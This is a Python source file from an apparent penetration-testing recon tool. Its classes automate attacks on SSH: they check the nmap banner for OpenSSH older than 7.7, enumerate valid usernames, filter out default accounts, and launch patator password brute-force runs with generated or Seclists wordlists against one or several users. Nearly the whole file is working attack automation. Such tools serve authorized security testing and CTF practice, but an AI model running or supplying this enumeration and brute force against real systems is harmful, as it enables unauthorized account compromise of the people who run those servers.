#!/usr/bin/env python3

import os
from subprocess import call
from sty import fg
import json
from autorecon.lib import nmapParser
from autorecon.utils import helper_lists
from autorecon.utils import config_parser


class Brute:
    """The Brute Class Contains the default SSH brute Force Option functions and is pretty cool how i chained it all
    together. Check it out friend."""

    def __init__(self, target, serviceName, port):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.unique_users = []

    def SshUsersBrute(self):
        """If OpenSSH is in the service banner and < 7.7 from nmapParser's results. Then enumerate valid usernames from SSH using a small wordlist of around 600 common names.
        If a valid Username is found that isn't in the list of default linux / windows usernames, from autorecon.utils/helper_lists.py. Proceed to brute force that usernames password with
        patator using Seclists probable top 1575.txt wordlist with a few custom added passwords."""
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        cmd_info_orange = "[" + fg.li_yellow + "+" + fg.rs + "]"
        c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
        dlu = helper_lists.DefaultLinuxUsers(self.target)
        default_linux_users = dlu.default_linux_users
        cl = helper_lists.Cewl(self.target)
        if not os.path.exists(c.getPath("wordlists", "CewlPlus")):
            cl.CewlWordlist()
        blue = fg.li_blue
        green = fg.li_green
        yellow = fg.li_yellow
        red = fg.red
        teal = fg.li_cyan
        reset = fg.rs
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ssh_product = np.ssh_product
        ssh_version = np.ssh_version
        string_ssh_version = " ".join(map(str, ssh_version))
        lowercase_ssh_version = str(string_ssh_version).lower()
        first_two_nums = lowercase_ssh_version[0:3]
        int_first_two_nums = float(first_two_nums)
        if ssh_product[0] == "OpenSSH":
            if int_first_two_nums < float(7.7):
                if not os.path.exists(c.getPath("ssh", "sshDir")):
                    os.makedirs(c.getPath("ssh", "sshDir"))
                cmd = c.getCmd("ssh", "ssh_user_enum", port=self.port)
                print(cmd_info, cmd)
                print("This may take a few minutes.")
                try:
                    call(cmd, shell=True)
                except ConnectionRefusedError as cre_error:
                    print(cre_error)
                    exit()
                try:
                    with open(c.getPath("ssh", "ssh_usernames"), "r") as json_file:
                        data = json.load(json_file)
                        num_valid_users = len(data["Valid"])
                        if num_valid_users < 55:
                            for valid in data["Valid"]:
                                if valid not in default_linux_users:
                                    print(f"""{cmd_info} {teal}Unique User Found!{reset} {green}{valid}{reset}""")
                                    self.unique_users.append(valid)
                                else:
                                    print(f"""{cmd_info} """ + valid)

                        else:
                            print(f"""OpenSSH returned too many false positives: {num_valid_users}""")
                except FileNotFoundError as fnf_error:
                    print(fnf_error)
                    exit()

                if len(self.unique_users) > 0 and (len(self.unique_users) < 4):
                    if os.path.exists(c.getPath("wordlists", "CewlPlus")):
                        if os.path.getsize(c.getPath("wordlists", "CewlPlus")) > 0:
                            for u in self.unique_users:
                                print(f"""{teal}Beginning Password Brute Force for User: {reset} {green}{u}{reset}""")
                                patator_cmd = c.getCmd("ssh", "patator_ssh_cewl_auto", port=self.port, user=u)
                                print(f"""{cmd_info} {patator_cmd}""")
                                call(patator_cmd, shell=True)
                    else:
                        for u in self.unique_users:
                            print(f"""{teal}Beginning Password Brute Force for User: {reset} {green}{u}{reset}""")
                            patator_cmd = c.getCmd("ssh", "patator_ssh_auto", port=self.port, user=u)
                            print(f"""{cmd_info} {patator_cmd}""")
                            call(patator_cmd, shell=True)
        else:
            print(f"""{blue}{ssh_product[0]} {ssh_version[0]}{reset} is {red}NOT{reset} vulnerable to User Enumeration""")
            print(f"""If you still want to brute force SSH, Consider using a tool such as Hydra or Patator manually.""")
            print(f"""For example""")
            print(f"""{cmd_info_orange}{yellow} {c.getCmd("ssh","patator_ssh_auto", port=self.port, user="admin")} {reset}""")


class BruteSingleUser:
    def __init__(self, target, serviceName, port, user):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user

    def SshSingleUserBrute(self):
        """Run patator with seclists probable top 1575 wordlist against a single user specified as a command line argument."""
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
        cl = helper_lists.Cewl(self.target)
        if not os.path.exists(c.getPath("wordlists", "CewlPlus")):
            cl.CewlWordlist()
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        if os.path.exists(c.getPath("wordlists", "CewlPlus")):
            if os.path.getsize(c.getPath("wordlists", "CewlPlus")) > 0:
                print(f"""{teal}Beginning Password Brute Force for User: {reset} {green}{self.user}{reset}""")
                patator_cmd = c.getCmd("ssh", "patator_ssh_cewl_auto", port=self.port, user=self.user)
                print(f"""{cmd_info} {patator_cmd}""")
                call(patator_cmd, shell=True)
        else:
            print(f"""{teal}Beginning Password Brute Force for User: {reset} {green}{self.user}{reset}""")
            patator_cmd = c.getCmd("ssh", "patator_ssh_auto", port=self.port, user=self.user)
            print(f"""{cmd_info} {patator_cmd}""")
            call(patator_cmd, shell=True)


class BruteSingleUserCustom:
    def __init__(self, target, serviceName, port, user, passList):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user
        self.passList = passList

    def SshSingleUserBruteCustom(self):
        """Run patator with custome wordlist against a single user specified as a command line argument."""
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        print(f"""{teal}Beginning Password Brute Force for User: {reset} {green}{self.user}{reset}""")
        patator_cmd = c.getCmd("ssh", "patator_ssh_single_user_custom", port=self.port, user=self.user, wordlist=self.passList)
        print(f"""{cmd_info} {patator_cmd}""")
        call(patator_cmd, shell=True)


class BruteMultipleUsersCustom:
    def __init__(self, target, serviceName, port, users, passList):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.users = users
        self.passList = passList

    def SshMultipleUsersBruteCustom(self):
        """Run patator with custome wordlist against a single user specified as a command line argument."""
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        print(f"""{teal}Beginning Password Brute Force for User: {reset} {green}{self.users}{reset}""")
        patator_cmd = c.getCmd("ssh", "patator_ssh_multiple_users_custom", port=self.port, users=self.users, wordlist=self.passList)
        print(f"""{cmd_info} {patator_cmd}""")
        call(patator_cmd, shell=True)
